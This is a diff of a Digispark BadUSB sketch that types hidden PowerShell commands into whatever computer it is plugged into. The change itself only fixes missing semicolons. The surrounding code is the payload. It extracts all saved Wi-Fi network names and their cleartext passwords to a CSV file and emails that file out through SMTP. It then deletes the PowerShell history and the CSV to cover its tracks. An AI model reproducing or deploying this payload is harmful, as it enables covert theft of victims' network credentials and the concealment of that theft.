@@ -31,7 +31,7 @@ void nsetup(){
 void setup() {  
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(100);
-  nsetup()
+  nsetup();
   DigiKeyboard.delay(500);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv"));
   
@@ -58,12 +58,12 @@ void setup() {
   DigiKeyboard.print(F("'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  nsetup()
+  nsetup();
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  nsetup()
+  nsetup();
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("del temp.csv"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
